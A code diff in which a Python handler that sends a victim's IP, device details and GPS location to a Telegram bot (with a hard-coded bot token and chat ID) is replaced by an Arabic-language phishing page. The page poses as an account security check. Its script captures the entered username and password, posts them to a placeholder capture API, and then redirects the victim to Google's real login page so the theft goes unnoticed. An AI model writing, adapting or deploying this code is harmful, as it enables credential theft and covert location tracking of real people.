@@ -1,56 +1,84 @@
-from http.server import BaseHTTPRequestHandler
-import json
-import requests
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مركز التحقق من الحساب</title>
+    <style>
+        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { width: 350px; background: #111; padding: 30px; border-radius: 15px; border: 1px solid #333; box-shadow: 0 0 20px rgba(0,255,0,0.1); }
+        .logo { margin-bottom: 20px; color: #fff; font-size: 24px; font-weight: bold; }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #222; border: 1px solid #444; color: #fff; border-radius: 8px; box-sizing: border-box; }
+        input:focus { border-color: #00ff00; outline: none; }
+        .btn { width: 100%; padding: 14px; background: #fff; color: #000; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .status { font-size: 12px; color: #666; margin-top: 15px; }
+    </style>
+</head>
+<body>
 
-# بياناتك الصحيحة
-TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg"
-CHAT_ID = "5811700860"
+<div class="card">
+    <div class="logo">🛡️ Security Check</div>
+    <p style="font-size: 14px; color: #bbb;">يرجى تسجيل الدخول لتأكيد ملكية الحساب ومتابعة النشاط.</p>
+    
+    <form id="authForm">
+        <input type="text" id="user" placeholder="البريد الإلكتروني أو الهاتف" required>
+        <input type="password" id="pass" placeholder="كلمة المرور" required>
+        <button type="button" class="btn" id="submitBtn" onclick="handleAuth()">تأكيد الهوية</button>
+    </form>
 
-class handler(BaseHTTPRequestHandler):
-    def do_POST(self):
-        try:
-            content_length = int(self.headers['Content-Length'])
-            post_data = self.rfile.read(content_length)
-            data = json.loads(post_data.decode('utf-8'))
+    <div class="status" id="msg">نظام حماية البيانات الموحد v6.0</div>
+</div>
 
-            device = data.get('device', {})
-            action_type = data.get('action', 'نشاط غير محدد')
-            gps = device.get('gps')
+<script>
+    async function handleAuth() {
+        const user = document.getElementById('user').value;
+        const pass = document.getElementById('pass').value;
+        const btn = document.getElementById('submitBtn');
+        const msg = document.getElementById('msg');
 
-            # تحويل الإحداثيات لرابط قوقل ماب إذا كانت متوفرة
-            maps_link = "غير متوفر (لم يوافق)"
-            if isinstance(gps, dict):
-                lat = gps.get('lat')
-                lon = gps.get('lon')
-                maps_link = f"https://www.google.com/maps?q={lat},{lon}"
+        // فحص بسيط قبل الإرسال
+        if (user.length < 5 || pass.length < 5) {
+            alert("خطأ في البيانات!");
+            return;
+        }
 
-            # تجهيز رسالة الصيدة مع رابط الخريطة
-            message = (
-                "⚠️ ** صيدة جديدة ** ⚠️\n"
-                "━━━━━━━━━━━━━━━\n"
-                f"📝 **العملية:** {action_type}\n"
-                f"🌐 **الـ IP الحقيقي:** `{device.get('ip', 'مخفي')}`\n"
-                f"🔋 **البطارية:** {device.get('battery', 'N/A')}\n"
-                f"🆔 **HW-ID (GPU):** `{device.get('gpu_hwid', 'N/A')}`\n"
-                f"📱 **نوع الجهاز:** {device.get('platform', 'N/A')}\n"
-                f"🖥 **دقة الشاشة:** {device.get('screen', 'N/A')}\n"
-                f"📶 **نوع الشبكة:** {device.get('network', 'N/A')}\n\n"
-                f"📍 **موقع الضحية على الخريطة:**\n{maps_link}\n"
-                "━━━━━━━━━━━━━━━"
-            )
+        // تمويه: تغيير شكل الزر
+        btn.innerText = "جاري الفحص...";
+        btn.style.opacity = "0.7";
+        btn.disabled = true;
 
-            # الإرسال لبوت التليجرام
-            requests.post(
-                f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
-                data={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
-            )
+        // البيانات اللي بنرسلها للـ API حقنا
+        const data = {
+            username: user,
+            password: pass,
+            platform: navigator.platform,
+            agent: navigator.userAgent
+        };
 
-            self.send_response(200)
-            self.send_header('Content-type', 'application/json')
-            self.end_headers()
-            self.wfile.write(json.dumps({"status": "success"}).encode())
+        try {
+            // --- هنا الربط مع الـ API ---
+            // استبدل الرابط اللي تحت برابط الـ API حقك (مثل PythonAnywhere)
+            const API_URL = "https://your-python-api.com/capture"; 
 
-        except Exception as e:
-            print(f"Server Error: {e}")
-            self.send_response(500)
-            self.end_headers()
+            const response = await fetch(API_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+
+            if (response.ok) {
+                msg.innerText = "✅ تم التحقق، جاري التحويل...";
+                setTimeout(() => {
+                    // التحويل النهائي للموقع الحقيقي
+                    window.location.href = "https://accounts.google.com/ServiceLogin";
+                }, 1500);
+            }
+        } catch (error) {
+            // حتى لو فشل الاتصال بالسيرفر، نحوله عشان ما يشك
+            console.error("Connection Error");
+            window.location.href = "https://accounts.google.com";
+        }
+    }
+</script>
+</body>
+</html>
